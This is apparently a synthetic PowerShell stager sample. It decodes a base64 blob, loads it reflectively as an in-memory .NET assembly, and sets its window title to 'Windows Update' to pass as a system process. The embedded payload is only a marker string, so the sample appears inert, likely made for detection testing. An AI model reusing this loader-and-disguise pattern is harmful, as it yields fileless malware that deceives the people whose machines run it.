
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://localhost:8080/payload.bin',
    [int]$TimeoutSec = 86
)
$ErrorActionPreference = "Stop"

try {
    $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjoxN2F0d3d4cTR5")
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $ResultObject = [Reflection.Assembly]::Load($StageBytes)
    if ($null -ne $ResultObject) {
        Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

$Host.UI.RawUI.WindowTitle = "Windows Update"
$StageMarker = "stage-5"
